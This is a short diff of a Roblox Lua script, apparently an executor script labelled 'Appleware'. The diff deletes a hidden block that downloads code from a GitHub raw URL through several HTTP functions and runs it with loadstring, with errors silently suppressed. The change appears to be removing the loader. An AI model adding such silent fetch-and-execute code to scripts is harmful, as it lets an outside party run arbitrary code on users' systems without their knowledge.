@@ -1,25 +1,3 @@
--- ================================================================
--- Appleware
--- ================================================================
-
-task.spawn(function()
-    pcall(function()
-        local url = "https://raw.githubusercontent.com/Toolboxhubbot/antifling/refs/heads/main/antifling"
-        local src
-        pcall(function() if game.HttpGet then src = game.HttpGet(url) end end)
-        if not src and syn and syn.request then
-            pcall(function() local r = syn.request({Url=url, Method="GET"}); if r and r.Body then src = r.Body end end)
-        end
-        if not src and request then
-            pcall(function() local r = request({Url=url, Method="GET"}); if r and r.Body then src = r.Body end end)
-        end
-        if not src or #src < 10 then return end
-        local fn
-        pcall(function() fn = loadstring(src) end)
-        if fn then pcall(fn) end
-    end)
-end)
-
 Players = game:GetService("Players")
 RunService = game:GetService("RunService")
 TweenService = game:GetService("TweenService")
